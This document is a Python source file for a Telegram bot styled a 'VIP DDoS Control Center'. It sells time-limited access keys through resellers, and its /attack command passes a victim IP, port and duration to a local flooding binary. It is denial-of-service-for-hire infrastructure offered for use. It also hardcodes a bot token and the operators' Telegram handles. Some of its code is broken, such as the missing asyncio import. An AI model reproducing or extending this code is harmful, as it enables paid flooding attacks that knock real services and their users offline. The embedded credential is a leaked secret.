import os
import json
import time
import random
import string
import threading
import datetime
import calendar
import subprocess
import logging
from dateutil.relativedelta import relativedelta
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.markdown import escape_md

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Telegram bot token
BOT_TOKEN = '8147615549:AAGwT0ppniPc4UqlgtB-akzN9t0B4djMTAY'
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# Admin user IDs with usernames and nicknames
admin_id = {
    "6258297180": {"username": "@Rahul_618", "nickname": "Rahul"},
    "1807014348": {"username": "@sadiq9869", "nickname": "Master Owner"},
    "1866961136": {"username": "@Rohan2349", "nickname": "Rohan Guru"}
}

# Bot configuration for attack parameters
BOT_CONFIG = {
    'packet_size': 1024,
    'attack_threads': 800
}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"

# Per key cost for resellers
KEY_COST = {"1hour": 10, "1day": 100, "7days": 450, "1month": 900}

# In-memory storage
users = {}
keys = {}
resellers = {}
last_attack_time = {}
attacks = {}
data_lock = threading.Lock()
bot_start_time = datetime.datetime.now()
global_attack_active = False
COOLDOWN_PERIOD = 60

# Enhanced MarkdownV2 escape function
def escape_markdown_v2(text):
    """Escape all special characters for Telegram MarkdownV2."""
    if not text:
        return ""
    special_chars = r'_[]()~`>#+-=|{}.!@*'
    return ''.join(f'\\{char}' if char in special_chars else char for char in str(text))

# Load data from files
def load_data():
    global users, keys, resellers
    with data_lock:
        users = read_json(USER_FILE, {})
        keys = read_json(KEY_FILE, {})
        resellers = read_json(RESELLERS_FILE, {})

def read_json(file_path, default):
    try:
        with open(file_path, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        logger.error(f"Error reading {file_path}: {e}")
        return default

def save_json(file_path, data):
    with data_lock:
        try:
            with open(file_path, "w") as file:
                json.dump(data, file, indent=4)
        except Exception as e:
            logger.error(f"Error saving {file_path}: {e}")

# Utility functions
def create_random_key(length=10):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    return f"ROHAN-PK-{random_key.upper()}"

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now()
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

def log_command(user_id, target, port, time):
    user_info = admin_id.get(user_id, {"nickname": f"UserID: {user_id}", "username": f"UserID: {user_id}"})
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, "a") as file:
        file.write(f"[{timestamp}] Nickname: {user_info['nickname']} (Username: {user_info['username']})\nTarget: {target}\nPort: {port}\nTime: {time} seconds\nBinary: Rohan\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    nickname = admin_id.get(user_id, {"nickname": f"UserID: {user_id}"})["nickname"]
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] Nickname: {nickname} | UserID: {user_id} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Command Handlers
@dp.message_handler(commands=['start'])
async def start_command(message: types.Message):
    user_id = str(message.from_user.id)
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🚀 Launch Attack", callback_data="attack"),
        InlineKeyboardButton("👤 Profile", callback_data="myinfo"),
        InlineKeyboardButton("🎟️ Redeem Key", callback_data="redeem"),
        InlineKeyboardButton("📊 Status", callback_data="status"),
        InlineKeyboardButton("❓ Help", callback_data="help"),
        InlineKeyboardButton("💰 Balance", callback_data="balance")
    )
    welcome_message = (
        "🌌 *VIP DDOS Control Center* 🌌\n"
        "══════════════════════════════\n"
        "✨ Welcome to the ultimate attack panel!\n"
        "🔥 Features:\n"
        "  • 🚀 Launch devastating attacks\n"
        "  • 👤 View your profile\n"
        "  • 🎟️ Redeem access keys\n"
        "  • 📊 Monitor bot status\n"
        "  • ❓ Get assistance\n"
        "  • 💰 Check reseller balance\n"
        "══════════════════════════════\n"
        f"👑 Owner: {escape_markdown_v2('@Rahul_618')}\n"
        f"📩 Support: {escape_markdown_v2('@Rohan2349')}, {escape_markdown_v2('@sadiq9869')}"
    )
    try:
        await message.reply(welcome_message, reply_markup=markup, parse_mode='MarkdownV2')
    except Exception as e:
        await message.reply("❌ Error displaying dashboard. Contact support.", parse_mode='MarkdownV2')
        logger.error(f"Start command error: {e}")

@dp.message_handler(commands=['help'])
async def help_command(message: types.Message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        await message.reply("🚫 *Access Denied* \\| Admin only\\.", parse_mode='MarkdownV2')
        return
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🔧 Bot Controls", callback_data="help_bot_controls"),
        InlineKeyboardButton("⚡ Attack Management", callback_data="help_power_management"),
        InlineKeyboardButton("📈 Reseller Tools", callback_data="help_reseller_tools")
    )
    help_text = (
        "🎮 *Admin Command Center* 🎮\n"
        "══════════════════════════════\n"
        "🔥 Navigate the control panel:\n"
        "  • 🔧 *Bot Controls*: Manage bot operations\n"
        "  • ⚡ *Attack Management*: Control attacks\n"
        "  • 📈 *Reseller Tools*: Manage resellers\n"
        "══════════════════════════════\n"
        f"📩 Support: {escape_markdown_v2('@Rahul_618')} {escape_markdown_v2('@Rohan2349')}, {escape_markdown_v2('@sadiq9869')}"
    )
    await message.reply(help_text, reply_markup=markup, parse_mode='MarkdownV2')

@dp.message_handler(commands=['attack'])
async def handle_attack_command(message: types.Message):
    user_id = str(message.from_user.id)
    if user_id not in users:
        await message.reply(
            f"⛔ *Unauthorized* \\| Contact {escape_markdown_v2('@Rahul_618')}, {escape_markdown_v2('@Rohan2349')}, or {escape_markdown_v2('@sadiq9869')}\\.",
            parse_mode='MarkdownV2'
        )
        return
    expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
    if datetime.datetime.now() > expiration_date:
        await message.reply(
            f"❌ *Access Expired* \\| Contact {escape_markdown_v2('@Rahul_618')} or {escape_markdown_v2('@sadiq9869')}\\.",
            parse_mode='MarkdownV2'
        )
        return
    if user_id in last_attack_time:
        time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
        if time_since_last_attack < COOLDOWN_PERIOD:
            remaining = int(COOLDOWN_PERIOD - time_since_last_attack)
            progress = int((time_since_last_attack / COOLDOWN_PERIOD) * 10)
            bar = "█" * progress + "▒" * (10 - progress)
            await message.reply(
                f"⌛ *Cooldown Active* ⌛\n"
                f"══════════════════════════════\n"
                f"⏳ Wait: {remaining} seconds\n"
                f"📊 Progress: {bar} {int(time_since_last_attack/COOLDOWN_PERIOD*100)}%\n"
                f"══════════════════════════════",
                parse_mode='MarkdownV2'
            )
            return
    with data_lock:
        if global_attack_active:
            await message.reply("❌ *Attack in Progress* \\| Wait for completion\\.", parse_mode='MarkdownV2')
            return
        if user_id in attacks:
            await message.reply("❌ *Active Attack* \\| Wait for completion\\.", parse_mode='MarkdownV2')
            return
    args = message.text.split()
    if len(args) != 4:
        await message.reply(
            "📋 *Attack Instructions* 📋\n"
            "══════════════════════════════\n"
            "🔥 Format: `/attack [IP] [PORT] [TIME]`\n"
            "📌 Example: `/attack 127.0.0.1 8000 60`\n"
            "⏳ Max Duration: 240 seconds\n"
            "══════════════════════════════",
            parse_mode='MarkdownV2'
        )
        return
    try:
        ip = args[1]
        port = int(args[2])
        duration = int(args[3])
        if duration > 240 or duration <= 0:
            await message.reply("❌ *Invalid Duration* \\| Must be 1-240 seconds\\.", parse_mode='MarkdownV2')
            return
        record_command_logs(user_id, 'attack', ip, port, duration)
        log_command(user_id, ip, port, duration)
        loading_msg = await message.reply("🚀 *Preparing Attack* \\| ███ 0%...", parse_mode='MarkdownV2')
        await asyncio.sleep(1)
        await bot.edit_message_text(
            "🚀 *Preparing Attack* \\| ██████ 50%...", 
            chat_id=message.chat.id, 
            message_id=loading_msg.message_id, 
            parse_mode='MarkdownV2'
        )
        await asyncio.sleep(1)
        await bot.edit_message_text(
            "🚀 *Preparing Attack* \\| █████████ 100%...", 
            chat_id=message.chat.id, 
            message_id=loading_msg.message_id, 
            parse_mode='MarkdownV2'
        )
        await asyncio.sleep(0.5)
        username = message.from_user.username or "No username"
        response = (
            "💥 *Attack Launched* 💥\n"
            "══════════════════════════════\n"
            f"🎯 Target: {escape_markdown_v2(ip)}:{port}\n"
            f"⏳ Duration: {duration} seconds\n"
            f"👤 Attacker: {escape_markdown_v2('@' + username if username != 'No username' else username)}\n"
            "══════════════════════════════\n"
        f"⚡ Powered by:{escape_markdown_v2('@Rahul_618')} & {escape_markdown_v2('@Rohan2349')} & {escape_markdown_v2('@sadiq9869')}"
        )
        await bot.edit_message_text(
            response, 
            chat_id=message.chat.id, 
            message_id=loading_msg.message_id, 
            parse_mode='MarkdownV2'
        )
        last_attack_time[user_id] = datetime.datetime.now()
        threading.Thread(target=run_attack, args=(user_id, ip, port, duration, message.chat.id)).start()
    except ValueError:
        await message.reply(
            "❌ *Invalid Format* \\| Use `/attack [IP] [PORT] [TIME]`\n"
            "Example: `/attack 127.0.0.1 8000 60`",
            parse_mode='MarkdownV2'
        )

async def run_attack(user_id, ip, port, duration, chat_id):
    global global_attack_active
    try:
        if not os.path.exists('./Rohan'):
            raise FileNotFoundError("Rohan binary not found")
        with data_lock:
            global_attack_active = True
        packet_size = BOT_CONFIG['packet_size']
        process = subprocess.Popen(
            ['./Rohan', ip, str(port), str(duration), str(packet_size)],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        with data_lock:
            attacks[user_id] = {'process': process, 'chat_id': chat_id}
        stdout, stderr = process.communicate(timeout=duration + 10)
        if process.returncode != 0:
            raise subprocess.SubprocessError(f"Attack failed: {stderr.decode('utf-8', errors='ignore')}")
        await bot.send_message(
            chat_id,
            (
                "✅ *Attack Completed* ✅\n"
                "══════════════════════════════\n"
                f"🎯 Target: {escape_markdown_v2(ip)}:{port}\n"
                f"⏳ Duration: {duration} seconds\n"
                f"🏆 Result: Success\\!\n"
                "══════════════════════════════"
            ),
            parse_mode='MarkdownV2'
        )
    except (FileNotFoundError, subprocess.SubprocessError, subprocess.TimeoutExpired) as e:
        await bot.send_message(
            chat_id, 
            f"❌ *Attack Failed* \\| Error: {escape_markdown_v2(str(e))}", 
            parse_mode='MarkdownV2'
        )
    except Exception as e:
        await bot.send_message(
            chat_id, 
            "❌ *Attack Failed* \\| Unexpected error\\.", 
            parse_mode='MarkdownV2'
        )
    finally:
        with data_lock:
            if user_id in attacks:
                del attacks[user_id]
            global_attack_active = False

@dp.message_handler(commands=['genkey'])
async def generate_key(message: types.Message):
    user_id = str(message.from_user.id)
    command = message.text.split()
    if len(command) != 2:
        await message.reply(
            "📜 *Generate Key* 📜\n"
            "══════════════════════════════\n"
            "🔑 Usage: `/genkey <duration>`\n"
            "📋 Available: 1hour, 1day, 7days, 1month\n"
            "📌 Example: `/genkey 1day`\n"
            "══════════════════════════════",
            parse_mode='MarkdownV2'
        )
        return
    duration = command[1].lower()
    if duration not in KEY_COST:
        await message.reply(
            "❌ *Invalid Duration* \\| Choose: 1hour, 1day, 7days, 1month", 
            parse_mode='MarkdownV2'
        )
        return
    cost = KEY_COST[duration]
    if user_id in admin_id:
        key = create_random_key()
        keys[key] = {"duration": duration, "expiration_time": None}
        save_json(KEY_FILE, keys)
        response = (
            "🔑 *Key Generated* 🔑\n"
            "══════════════════════════════\n"
            f"🔐 Key: {escape_markdown_v2(key)}\n"
            f"⏳ Duration: {duration}\n"
            "══════════════════════════════"
        )
    elif user_id in resellers:
        if resellers[user_id] >= cost:
            resellers[user_id] -= cost
            save_json(RESELLERS_FILE, resellers)
            key = create_random_key()
            keys[key] = {"duration": duration, "expiration_time": None}
            save_json(KEY_FILE, keys)
            response = (
                "🔑 *Key Generated* 🔑\n"
                "══════════════════════════════\n"
                f"🔐 Key: {escape_markdown_v2(key)}\n"
                f"⏳ Duration: {duration}\n"
                f"💸 Cost: {cost} Rs\n"
                f"💰 Balance: {resellers[user_id]} Rs\n"
                "══════════════════════════════"
            )
        else:
            response = (
                "❌ *Insufficient Balance* ❌\n"
                "══════════════════════════════\n"
                f"💸 Required: {cost} Rs\n"
                f"💰 Available: {resellers[user_id]} Rs\n"
                "══════════════════════════════"
            )
    else:
        response = "❌ *Access Denied* \\| Admin or reseller only\\."
    await message.reply(response, parse_mode='MarkdownV2')

@dp.message_handler(commands=['balance'])
async def check_balance(message: types.Message):
    user_id = str(message.from_user.id)
    if user_id in resellers:
        await message.reply(
            f"💰 *Balance* 💰\n"
            f"══════════════════════════════\n"
            f"📊 Amount: {resellers[user_id]} Rs\n"
            f"══════════════════════════════",
            parse_mode='MarkdownV2'
        )
    else:
        await message.reply("❌ *Access Denied* \\| Reseller only\\.", parse_mode='MarkdownV2')

@dp.message_handler(commands=['redeem'])
async def redeem_key_prompt(message: types.Message):
    await message.reply(
        "🔑 *Redeem Key* 🔑\n"
        "══════════════════════════════\n"
        "📝 Enter your key below:\n"
        "══════════════════════════════",
        parse_mode='MarkdownV2'
    )
    dp.register_next_step_handler(message, process_redeem_key)

async def process_redeem_key(message: types.Message):
    user_id = str(message.from_user.id)
    key = message.text.strip()
    if key in keys:
        if user_id in users:
            current_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() < current_expiration:
                await message.reply(
                    "❌ *Active Access* \\| You already have access\\.", 
                    parse_mode='MarkdownV2'
                )
                return
            else:
                del users[user_id]
                save_json(USER_FILE, users)
        duration = keys[key]["duration"]
        expiration_time = {
            "1hour": add_time_to_current_date(hours=1),
            "1day": add_time_to_current_date(days=1),
            "7days": add_time_to_current_date(days=7),
            "1month": add_time_to_current_date(months=1)
        }.get(duration)
        if not expiration_time:
            await message.reply("❌ *Invalid Key Duration*\\.", parse_mode='MarkdownV2')
            return
        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_json(USER_FILE, users)
        del keys[key]
        save_json(KEY_FILE, keys)
        await message.reply(
            f"✅ *Access Granted* ✅\n"
            f"══════════════════════════════\n"
            f"⏳ Expires: {users[user_id]}\n"
            f"══════════════════════════════",
            parse_mode='MarkdownV2'
        )
    else:
        await message.reply("❌ *Invalid or Expired Key*\\.", parse_mode='MarkdownV2')

@dp.message_handler(commands=['logs'])
async def show_recent_logs(message: types.Message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        await message.reply("❌ *Access Denied* \\| Admin only\\.", parse_mode='MarkdownV2')
        return
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        with open(LOG_FILE, "rb") as file:
            await bot.send_document(message.chat.id, file, caption="📜 *Recent Logs*")
    else:
        await message.reply("❌ *No Logs Found*\\.", parse_mode='MarkdownV2')

@dp.message_handler(commands=['add_reseller'])
async def add_reseller(message: types.Message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        await message.reply("❌ *Access Denied* \\| Admin only\\.", parse_mode='MarkdownV2')
        return
    command = message.text.split()
    if len(command) != 3:
        await message.reply(
            "📜 *Add Reseller* 📜\n"
            "══════════════════════════════\n"
            "🔧 Usage: `/add_reseller <user_id> <balance>`\n"
            "📌 Example: `/add_reseller 123456789 500`\n"
            "══════════════════════════════",
            parse_mode='MarkdownV2'
        )
        return
    reseller_id = command[1]
    try:
        initial_balance = int(command[2])
        if initial_balance < 0:
            raise ValueError
    except ValueError:
        await message.reply("❌ *Invalid Balance Amount*\\.", parse_mode='MarkdownV2')
        return
    resellers[reseller_id] = initial_balance
    save_json(RESELLERS_FILE, resellers)
    await message.reply(
        f"✅ *Reseller Added* ✅\n"
        f"══════════════════════════════\n"
        f"🆔 ID: {escape_markdown_v2(reseller_id)}\n"
        f"💰 Balance: {initial_balance} Rs\n"
        f"══════════════════════════════",
        parse_mode='MarkdownV2'
    )

@dp.message_handler(commands=['users'])
async def list_authorized_users(message: types.Message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        await message.reply("❌ *Access Denied* \\| Admin only\\.", parse_mode='MarkdownV2')
        return
    if not users:
        await message.reply("❌ *No Authorized Users*\\.", parse_mode='MarkdownV2')
        return
    response = "👥 *Authorized Users* 👥\n══════════════════════════════\n"
    for user, expiration in users.items():
        try:
            user_info = await bot.get_chat(user)
            username = user_info.username or user_info.first_name
            response += (
                f"👤 ID: {user}\n"
                f"📛 Username: {escape_markdown_v2('@' + username if username else user_info.first_name)}\n"
                f"⏳ Expires: {expiration}\n"
                "──────────────────────\n"
            )
        except Exception as e:
            logger.error(f"Error fetching user info for {user}: {e}")
    await message.reply(response, parse_mode='MarkdownV2')

@dp.message_handler(commands=['remove'])
async def remove_user(message: types.Message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        await message.reply("❌ *Access Denied* \\| Admin only\\.", parse_mode='MarkdownV2')
        return
    command = message.text.split()
    if len(command) != 2:
        await message.reply(
            "📜 *Remove User* 📜\n"
            "══════════════════════════════\n"
            "🔧 Usage: `/remove <user_id>`\n"
            "📌 Example: `/remove 123456789`\n"
            "══════════════════════════════",
            parse_mode='MarkdownV2'
        )
        return
    target_user_id = command[1]
    if target_user_id in users:
        del users[target_user_id]
        save_json(USER_FILE, users)
        await message.reply(
            f"✅ *User Removed* ✅\n"
            f"══════════════════════════════\n"
            f"🆔 ID: {escape_markdown_v2(target_user_id)}\n"
            f"══════════════════════════════",
            parse_mode='MarkdownV2'
        )
    else:
        await message.reply(
            f"❌ *User Not Found* \\| ID: {escape_markdown_v2(target_user_id)}",
            parse_mode='MarkdownV2'
        )

@dp.message_handler(commands=['resellers'])
async def show_resellers(message: types.Message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        await message.reply("❌ *Access Denied* \\| Admin only\\.", parse_mode='MarkdownV2')
        return
    if not resellers:
        await message.reply("❌ *No Resellers Found*\\.", parse_mode='MarkdownV2')
        return
    response = "🏦 *Resellers* 🏦\n══════════════════════════════\n"
    for reseller_id, balance in resellers.items():
        try:
            reseller_info = await bot.get_chat(reseller_id)
            username = reseller_info.username or "Unknown"
            response += (
                f"👤 Username: {escape_markdown_v2('@' + username if username != 'Unknown' else username)}\n"
                f"🆔 ID: {reseller_id}\n"
                f"💰 Balance: {balance} Rs\n"
                "──────────────────────\n"
            )
        except Exception as e:
            logger.error(f"Error fetching reseller info for {reseller_id}: {e}")
    await message.reply(response, parse_mode='MarkdownV2')

@dp.message_handler(commands=['addbalance'])
async def add_balance(message: types.Message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        await message.reply("❌ *Access Denied* \\| Admin only\\.", parse_mode='MarkdownV2')
        return
    command = message.text.split()
    if len(command) != 3:
        await message.reply(
            "📜 *Add Balance* 📜\n"
            "══════════════════════════════\n"
            "🔧 Usage: `/addbalance <reseller_id> <amount>`\n"
            "📌 Example: `/addbalance 123456789 500`\n"
            "══════════════════════════════",
            parse_mode='MarkdownV2'
        )
        return
    reseller_id = command[1]
    try:
        amount = float(command[2])
        if amount <= 0:
            raise ValueError
    except ValueError:
        await message.reply("❌ *Invalid Amount*\\.", parse_mode='MarkdownV2')
        return
    if reseller_id not in resellers:
        await message.reply("❌ *Reseller ID Not Found*\\.", parse_mode='MarkdownV2')
        return
    resellers[reseller_id] += amount
    save_json(RESELLERS_FILE, resellers)
    await message.reply(
        f"✅ *Balance Added* ✅\n"
        f"══════════════════════════════\n"
        f"🆔 ID: {escape_markdown_v2(reseller_id)}\n"
        f"💸 Amount: {amount} Rs\n"
        f"💰 New Balance: {resellers[reseller_id]} Rs\n"
        f"══════════════════════════════",
        parse_mode='MarkdownV2'
    )

@dp.message_handler(commands=['remove_reseller'])
async def remove_reseller(message: types.Message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        await message.reply("❌ *Access Denied* \\| Admin only\\.", parse_mode='MarkdownV2')
        return
    command = message.text.split()
    if len(command) != 2:
        await message.reply(
            "📜 *Remove Reseller* 📜\n"
            "══════════════════════════════\n"
            "🔧 Usage: `/remove_reseller <reseller_id>`\n"
            "📌 Example: `/remove_reseller 123456789`\n"
            "══════════════════════════════",
            parse_mode='MarkdownV2'
        )
        return
    reseller_id = command[1]
    if reseller_id not in resellers:
        await message.reply("❌ *Reseller ID Not Found*\\.", parse_mode='MarkdownV2')
        return
    del resellers[reseller_id]
    save_json(RESELLERS_FILE, resellers)
    await message.reply(
        f"✅ *Reseller Removed* ✅\n"
        f"══════════════════════════════\n"
        f"🆔 ID: {escape_markdown_v2(reseller_id)}\n"
        f"══════════════════════════════",
        parse_mode='MarkdownV2'
    )

@dp.message_handler(commands=['status'])
async def status_command(message: types.Message):
    user_id = str(message.from_user.id)
    uptime = datetime.datetime.now() - bot_start_time
    days, seconds = uptime.days, uptime.seconds
    hours, seconds = seconds // 3600, seconds % 3600
    minutes, seconds = seconds // 60, seconds % 60
    response = (
        "📊 *Bot Status* 📊\n"
        "══════════════════════════════\n"
        f"🕒 Uptime: {days}d {hours}h {minutes}m {seconds}s\n"
        f"👥 Users: {len(users)}\n"
        f"🔑 Keys: {len(keys)}\n"
        f"🏦 Resellers: {len(resellers)}\n"
        f"⚡ Active Attacks: {len(attacks)}\n"
    )
    if user_id in admin_id:
        response += f"🔧 Admin: {escape_markdown_v2(admin_id[user_id]['nickname'])}\n"
    response += (
        "══════════════════════════════\n"
        f"⚡ Powered by: {escape_markdown_v2('@Rahul_618')} & {escape_markdown_v2('@sadiq9869')}"
    )
    await message.reply(response, parse_mode='MarkdownV2')

# Callback Query Handler
@dp.callback_query_handler()
async def callback_query(callback: types.CallbackQuery):
    start_time = time.time()
    user_id = str(callback.from_user.id)
    await callback.answer()  # Acknowledge immediately
    actions = {
        "attack": lambda: handle_attack_button(callback, user_id),
        "myinfo": lambda: my_info(callback.message),
        "redeem": lambda: redeem_key_prompt(callback.message),
        "status": lambda: status_command(callback.message),
        "help": lambda: help_command(callback.message),
        "balance": lambda: check_balance(callback.message),
        "help_bot_controls": lambda: bot.send_message(
            callback.message.chat.id,
            (
                "🔧 *Bot Controls* 🔧\n"
                "══════════════════════════════\n"
                "• `/start` \\| Launch dashboard\n"
                "• `/help` \\| View command guide\n"
                "• `/status` \\| Check bot stats\n"
                "• `/logs` \\| View recent logs\n"
                "══════════════════════════════\n"
                f"📩 Support: {escape_markdown_v2('@Rahul_618')}, {escape_markdown_v2('@sadiq9869')}"
            ),
            parse_mode='MarkdownV2'
        ),
        "help_power_management": lambda: bot.send_message(
            callback.message.chat.id,
            (
                "⚡ *Attack Management* ⚡\n"
                "══════════════════════════════\n"
                "• `/attack [IP] [PORT] [TIME]` \\| Launch attack\n"
                "• `/users` \\| List authorized users\n"
                "• `/remove <id>` \\| Remove user\n"
                "══════════════════════════════\n"
                f"📩 Support: {escape_markdown_v2('@Rahul_618')}, {escape_markdown_v2('@sadiq9869')}"
            ),
            parse_mode='MarkdownV2'
        ),
        "help_reseller_tools": lambda: bot.send_message(
            callback.message.chat.id,
            (
                "📈 *Reseller Tools* 📈\n"
                "══════════════════════════════\n"
                "• `/add_reseller <id> <balance>` \\| Add reseller\n"
                "• `/genkey <duration>` \\| Generate key\n"
                "• `/resellers` \\| List resellers\n"
                "• `/addbalance <id> <amount>` \\| Add balance\n"
                "• `/remove_reseller <id>` \\| Remove reseller\n"
                "══════════════════════════════\n"
                f"📩 Support: {escape_markdown_v2('@Rahul_618')}, {escape_markdown_v2('@sadiq9869')}"
            ),
            parse_mode='MarkdownV2'
        )
    }
    action = actions.get(callback.data)
    if action:
        try:
            await action()
        except Exception as e:
            await bot.send_message(
                callback.message.chat.id, 
                f"❌ *Error* \\| {escape_markdown_v2(str(e))}", 
                parse_mode='MarkdownV2'
            )
            logger.error(f"Callback action error: {e}")
    end_time = time.time()
    logger.info(f"Callback query processed in {end_time - start_time:.2f} seconds (data: {callback.data})")

async def handle_attack_button(callback: types.CallbackQuery, user_id: str):
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            await callback.message.reply(
                f"❌ *Access Expired* \\| Contact {escape_markdown_v2('@Rahul_618')} or {escape_markdown_v2('@sadiq9869')}\\.",
                parse_mode='MarkdownV2'
            )
            return
        if user_id in last_attack_time:
            time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
            if time_since_last_attack < COOLDOWN_PERIOD:
                remaining = int(COOLDOWN_PERIOD - time_since_last_attack)
                progress = int((time_since_last_attack / COOLDOWN_PERIOD) * 10)
                bar = "█" * progress + "▒" * (10 - progress)
                await callback.message.reply(
                    f"⌛ *Cooldown Active* ⌛\n"
                    f"══════════════════════════════\n"
                    f"⏳ Wait: {remaining} seconds\n"
                    f"📊 Progress: {bar} {int(time_since_last_attack/COOLDOWN_PERIOD*100)}%\n"
                    f"══════════════════════════════",
                    parse_mode='MarkdownV2'
                )
                return
        await callback.message.reply(
            "📋 *Attack Instructions* 📋\n"
            "══════════════════════════════\n"
            "🔥 Format: `/attack [IP] [PORT] [TIME]`\n"
            "📌 Example: `/attack 127.0.0.1 8000 60`\n"
            "⏳ Max Duration: 240 seconds\n"
            "══════════════════════════════",
            parse_mode='MarkdownV2'
        )
    else:
        await callback.message.reply(
            f"⛔ *Unauthorized* \\| Contact {escape_markdown_v2('@Rahul_618')}, {escape_markdown_v2('@Rohan2349')}, or {escape_markdown_v2('@sadiq9869')}\\.",
            parse_mode='MarkdownV2'
        )

async def my_info(message: types.Message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or "No username"
    if user_id in admin_id:
        response = (
            "👤 *Your Profile* 👤\n"
            "══════════════════════════════\n"
            f"📛 Username: {escape_markdown_v2('@' + username if username != 'No username' else username)}\n"
            f"🆔 ID: {user_id}\n"
            f"🚹 Role: Admin\n"
            f"👑 Nickname: {escape_markdown_v2(admin_id[user_id]['nickname'])}\n"
            f"⏳ Expiration: N/A\n"
            "══════════════════════════════"
        )
    elif user_id in resellers:
        response = (
            "👤 *Your Profile* 👤\n"
            "══════════════════════════════\n"
            f"📛 Username: {escape_markdown_v2('@' + username if username != 'No username' else username)}\n"
            f"🆔 ID: {user_id}\n"
            f"🚹 Role: Reseller\n"
            f"💰 Balance: {resellers[user_id]} Rs\n"
            f"⏳ Expiration: N/A\n"
            "══════════════════════════════"
        )
    elif user_id in users:
        response = (
            "👤 *Your Profile* 👤\n"
            "══════════════════════════════\n"
            f"📛 Username: {escape_markdown_v2('@' + username if username != 'No username' else username)}\n"
            f"🆔 ID: {user_id}\n"
            f"🚹 Role: User\n"
            f"⏳ Expiration: {users[user_id]}\n"
            "══════════════════════════════"
        )
    else:
        response = (
            "👤 *Your Profile* 👤\n"
            "══════════════════════════════\n"
            f"📛 Username: {escape_markdown_v2('@' + username if username != 'No username' else username)}\n"
            f"🆔 ID: {user_id}\n"
            f"🚹 Role: Guest\n"
            f"⏳ Expiration: No access\n"
            "══════════════════════════════"
        )
    await message.reply(response, parse_mode='MarkdownV2')

# Main execution
if __name__ == "__main__":
    load_data()
    logger.info("Bot is starting...")
    executor.start_polling(dp, skip_updates=True)